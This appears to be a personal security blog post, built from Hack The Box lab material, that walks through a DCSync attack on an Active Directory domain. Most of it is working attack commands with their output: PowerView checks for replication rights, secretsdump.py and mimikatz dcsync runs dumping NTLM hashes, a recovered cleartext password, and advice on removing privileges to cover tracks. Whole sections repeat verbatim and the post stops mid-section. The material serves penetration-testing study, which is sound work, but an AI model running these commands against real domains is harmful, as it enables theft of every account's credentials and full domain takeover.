<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>On  Performing a DCSync Attack | v1pa0z Blog</title>
  <meta name="author" content="vipa0z">
  
  <meta name="description" content="my personal blog">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="On  Performing a DCSync Attack"/>
  <meta property="og:site_name" content="v1pa0z Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="v1pa0z Blog" type="application/atom+xml">
  
  
    <link href="/favicon.jpg" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">v1pa0z Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> On  Performing a DCSync Attack</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p><img src="/../images/REPACE.png" alt="alt text"><br><img src="/../images/dcysnc23.png" alt="alt text"></p>
<h1 id="Overview"><a href="#Overview" class="headerlink" title="_Overview"></a>_Overview</h1><p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p>
<p>The core of the attack involves exploiting the DS-Replication-Get-Changes-All extended right to prompt a Domain Controller to replicate password data. This specific Active Directory permission grants access to replicate sensitive, secret information across the domain.</p>
<hr>
<h3 id="Checking-user-Groups-SID-ACLs"><a href="#Checking-user-Groups-SID-ACLs" class="headerlink" title="Checking user Groups, SID, ACLs"></a>Checking user Groups, SID, ACLs</h3><p>PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account.</p>
<p>We first get the user’s SID in the above command and then check all ACLs set on the domain object (<code>&quot;DC=inlanefreight,DC=local&quot;</code>) using <a target="_blank" rel="noopener" href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/">Get-ObjectAcl</a> to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user <code>adunn</code> (denoted in the below command as <code>$sid</code>) possesses these rights. The command confirms that the user does indeed have the rights.<br>Checking for Replication–Get ACE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sid = &quot;&#123;sid-here&#125;&quot;</span><br><span class="line"></span><br><span class="line">PS&gt; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? &#123; ($_.ObjectAceType -match &#x27;Replication-Get&#x27;)&#125; | ?&#123;$_.SecurityIdentifier -match $sid&#125; |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164</span><br><span class="line">ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set</span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164</span><br><span class="line">ObjectAceType         : DS-Replication-Get-Changes</span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN</span><br></pre></td></tr></table></figure>
<p>If we had certain rights over the user (such as <a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl">WriteDacl</a>), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let’s see a few quick examples.</p>
<h3 id="exploit-replication-ACE-to-perform-DCsync"><a href="#exploit-replication-ACE-to-perform-DCsync" class="headerlink" title="exploit  replication ACE to perform DCsync"></a>exploit  replication ACE to perform DCsync</h3><h4 id="impacket-secretsdump-py"><a href="#impacket-secretsdump-py" class="headerlink" title="(impacket) secretsdump.py"></a>(impacket) secretsdump.py</h4><p>Running the tool as below will write all hashes to files with the prefix <code>inlanefreight_hashes</code>. The <code>-just-dc</code> flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.</p>
<p> Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">linux-attack$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 </span><br><span class="line"></span><br><span class="line">pass:</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5</span><br><span class="line">[*] Searching for NTDS.dit</span><br><span class="line">[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time</span><br><span class="line">[*] Using smbexec method for remote execution</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6</span><br><span class="line">[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp </span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::</span><br><span class="line">ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::</span><br><span class="line">ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::</span><br><span class="line">ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::</span><br><span class="line">inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::</span><br><span class="line">inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::</span><br></pre></td></tr></table></figure>
<p>We can use the <code>-just-dc-ntlm</code> flag if we only want NTLM hashes or specify <code>-just-dc-user &lt;USERNAME&gt;</code> to only extract data for a specific user. Other useful options include <code>-pwd-last-set</code> to see when each account’s password was last changed and <code>-history</code> if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The <code>-user-status</code> is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:</p>
<ul>
<li>Number and % of passwords cracked</li>
<li>top 10 passwords</li>
<li>Password length metrics</li>
<li>Password re-use</li>
</ul>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">runas /netonly /user:domain&lt;ilfreight\&#123;high-priv-user&#125;tpetty powershell &#123;requires pass&#125;</span><br><span class="line"></span><br><span class="line">./mimikatz.exe</span><br><span class="line"></span><br><span class="line"># lsadump::dcsync /domain:&#123;&#125; /user:&#123;domain\targetuser&#125; </span><br></pre></td></tr></table></figure>

<h4 id="Viewing-an-Account-with-Reversible-Encryption-Password-Storage-Set"><a href="#Viewing-an-Account-with-Reversible-Encryption-Password-Storage-Set" class="headerlink" title="Viewing an Account with Reversible Encryption Password Storage Set"></a>Viewing an Account with Reversible Encryption Password Storage Set</h4><p><img src="https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png" alt="image"></p>
<p>When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption.<br>The trick here is that the key needed to decrypt them is stored in the registry (the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview">Syskey</a>) and can be extracted by a Domain Admin or equivalent. Tools such as <code>secretsdump.py</code> will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.</p>
<p>If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the <code>Get-ADUser</code> cmdlet:</p>
<h4 id="Enumerating-Further-using-Get-ADUser"><a href="#Enumerating-Further-using-Get-ADUser" class="headerlink" title="Enumerating Further using Get-ADUser"></a>Enumerating Further using Get-ADUser</h4><p>  DCSync</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PS C:\htb&gt; Get-ADUser -Filter &#x27;userAccountControl -band 128&#x27; -Properties userAccountControl</span><br><span class="line"></span><br><span class="line">DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled            : True</span><br><span class="line">GivenName          :</span><br><span class="line">Name               : PROXYAGENT</span><br><span class="line">ObjectClass        : user</span><br><span class="line">ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334</span><br><span class="line">SamAccountName     : proxyagent</span><br><span class="line">SID                : S-1-5-21-3842939050-3880317879-2865463114-5222</span><br><span class="line">Surname            :</span><br><span class="line">userAccountControl : 640</span><br><span class="line">UserPrincipalName  :</span><br></pre></td></tr></table></figure>

<p>We can see that one account, <code>proxyagent</code>, has the reversible encryption option set with PowerView as well:</p>
<h4 id="Checking-for-Reversible-Encryption-Option-using-Get-DomainUser"><a href="#Checking-for-Reversible-Encryption-Option-using-Get-DomainUser" class="headerlink" title="Checking for Reversible Encryption Option using Get-DomainUser"></a>Checking for Reversible Encryption Option using Get-DomainUser</h4><p>  DCSync</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\htb&gt; Get-DomainUser -Identity * | ? &#123;$_.useraccountcontrol -like &#x27;*ENCRYPTED_TEXT_PWD_ALLOWED*&#x27;&#125; |select samaccountname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">samaccountname                         useraccountcontrol</span><br><span class="line">--------------                         ------------------</span><br><span class="line">proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT</span><br></pre></td></tr></table></figure>

<p>We will notice the tool decrypted the password and provided us with the cleartext value.</p>
<h4 id="Displaying-the-Decrypted-Password"><a href="#Displaying-the-Decrypted-Password" class="headerlink" title="Displaying the Decrypted Password"></a>Displaying the Decrypted Password</h4><p>  DCSync</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext </span><br><span class="line"></span><br><span class="line">proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!</span><br></pre></td></tr></table></figure>

<p>I have been on a few engagements where all user accounts were stored using reversible encryption. Some clients may do this to be able to dump NTDS and perform periodic password strength audits without having to resort to offline password cracking.</p>
<p>We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the <code>krbtgt</code> account and use this to create a <code>Golden Ticket</code> for persistence, but that is outside the scope of this module.</p>
<p>Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize <code>runas.exe</code> to accomplish this:</p>
<h4 id="Using-runas-exe"><a href="#Using-runas-exe" class="headerlink" title="Using runas.exe"></a>Using runas.exe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;runas /netonly /user:INLANEFREIGHT\adunn powershell</span><br><span class="line">Enter the password for INLANEFREIGHT\adunn:</span><br><span class="line">Attempting to start powershell as user &quot;INLANEFREIGHT\adunn&quot; ...</span><br></pre></td></tr></table></figure>

<p>From the newly spawned powershell session, we can perform the attack:</p>
<h4 id="Performing-the-Attack-with-Mimikatz"><a href="#Performing-the-Attack-with-Mimikatz" class="headerlink" title="Performing the Attack with Mimikatz"></a>Performing the Attack with Mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">PS C:\htb&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line">=================================================================</span><br><span class="line">mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</span><br><span class="line">[DC] &#x27;INLANEFREIGHT.LOCAL&#x27; will be the domain</span><br><span class="line">[DC] &#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;INLANEFREIGHT\administrator&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : administrator</span><br><span class="line">User Principal Name  : administrator@inlanefreight.local</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 10/27/2021 6:49:32 AM</span><br><span class="line">Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500</span><br><span class="line">Object Relative ID   : 500</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 88ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 4625fd0c31368ff4c255a3b876eaac3d</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>


<p>Credentails in memory -&gt; doesnt work past server 2012</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>


<p><code>requires sereplication privilege, check for that acl type</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$SID = Convert-Name-TO-SID &lt;name&gt;</span><br><span class="line">get-domainobjectACL -ResolveGUIDs -Identity * | ? &#123;$_.SecurityIdentifier -eq $SID&#125;</span><br></pre></td></tr></table></figure>

<p>#dcsyncing</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe</span><br><span class="line"></span><br><span class="line"># lsadump::dcsync /domain:&#123;&#125; /user:&#123;domain\targetuser&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="dcsync-linux"><a href="#dcsync-linux" class="headerlink" title="dcsync linux"></a>dcsync linux</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3</span><br></pre></td></tr></table></figure>





<hr>
<h2 id="Account-Enumeration"><a href="#Account-Enumeration" class="headerlink" title="Account Enumeration"></a>Account Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl</span><br></pre></td></tr></table></figure>

<h3 id="Checking-user-Groups-SID-ACLs-1"><a href="#Checking-user-Groups-SID-ACLs-1" class="headerlink" title="Checking user Groups, SID, ACLs"></a>Checking user Groups, SID, ACLs</h3><p>PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account.</p>
<p>We first get the user’s SID in the above command and then check all ACLs set on the domain object (<code>&quot;DC=inlanefreight,DC=local&quot;</code>) using <a target="_blank" rel="noopener" href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/">Get-ObjectAcl</a> to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user <code>adunn</code> (denoted in the below command as <code>$sid</code>) possesses these rights. The command confirms that the user does indeed have the rights.<br>Checking for Replication–Get ACE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sid = &quot;&#123;sid-here&#125;&quot;</span><br><span class="line"></span><br><span class="line">PS&gt; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? &#123; ($_.ObjectAceType -match &#x27;Replication-Get&#x27;)&#125; | ?&#123;$_.SecurityIdentifier -match $sid&#125; |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164</span><br><span class="line">ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set</span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164</span><br><span class="line">ObjectAceType         : DS-Replication-Get-Changes</span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN</span><br></pre></td></tr></table></figure>
<p>If we had certain rights over the user (such as <a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl">WriteDacl</a>), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let’s see a few quick examples.</p>
<h3 id="exploit-replication-ACE-to-perform-DCsync-1"><a href="#exploit-replication-ACE-to-perform-DCsync-1" class="headerlink" title="exploit  replication ACE to perform DCsync"></a>exploit  replication ACE to perform DCsync</h3><h4 id="impacket-secretsdump-py-1"><a href="#impacket-secretsdump-py-1" class="headerlink" title="(impacket) secretsdump.py"></a>(impacket) secretsdump.py</h4><p>Running the tool as below will write all hashes to files with the prefix <code>inlanefreight_hashes</code>. The <code>-just-dc</code> flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.</p>
<p> Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">linux-attack$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 </span><br><span class="line"></span><br><span class="line">pass:</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5</span><br><span class="line">[*] Searching for NTDS.dit</span><br><span class="line">[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time</span><br><span class="line">[*] Using smbexec method for remote execution</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6</span><br><span class="line">[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp </span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::</span><br><span class="line">ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::</span><br><span class="line">ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::</span><br><span class="line">ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::</span><br><span class="line">inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::</span><br><span class="line">inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::</span><br></pre></td></tr></table></figure>
<p>We can use the <code>-just-dc-ntlm</code> flag if we only want NTLM hashes or specify <code>-just-dc-user &lt;USERNAME&gt;</code> to only extract data for a specific user. Other useful options include <code>-pwd-last-set</code> to see when each account’s password was last changed and <code>-history</code> if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The <code>-user-status</code> is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:</p>
<ul>
<li>Number and % of passwords cracked</li>
<li>top 10 passwords</li>
<li>Password length metrics</li>
<li>Password re-use</li>
</ul>
<h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">runas /netonly /user:domain&lt;ilfreight\&#123;high-priv-user&#125;tpetty powershell &#123;requires pass&#125;</span><br><span class="line"></span><br><span class="line">./mimikatz.exe</span><br><span class="line"></span><br><span class="line"># lsadump::dcsync /domain:&#123;&#125; /user:&#123;domain\targetuser&#125; </span><br></pre></td></tr></table></figure>

<h4 id="Viewing-an-Account-with-Reversible-Encryption-Password-Storage-Set-1"><a href="#Viewing-an-Account-with-Reversible-Encryption-Password-Storage-Set-1" class="headerlink" title="Viewing an Account with Reversible Encryption Password Storage Set"></a>Viewing an Account with Reversible Encryption Password Storage Set</h4><p><img src="https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png" alt="image"></p>
